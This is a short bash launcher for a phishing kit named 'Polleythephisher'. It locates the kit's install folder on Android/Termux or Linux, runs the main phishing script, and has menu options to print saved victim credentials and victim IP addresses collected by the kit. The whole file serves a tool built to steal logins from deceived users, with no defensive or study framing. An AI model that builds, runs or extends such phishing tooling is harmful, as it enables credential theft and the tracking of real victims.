#!/bin/bash

# https://github.com/anknpolley123/Polleythephisher.git

if [[ $(uname -o) == *'Android'* ]];then
	POLLEY_ROOT="/data/data/com.termux/files/usr/opt/polleythephisher"
else
	export POLLEY_ROOT="/opt/polleythephisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Polleythephisher type \`polleythephisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $POLLEY_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $POLLEY_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $POLLEY_ROOT
	bash ./Polleythephisher.sh
fi

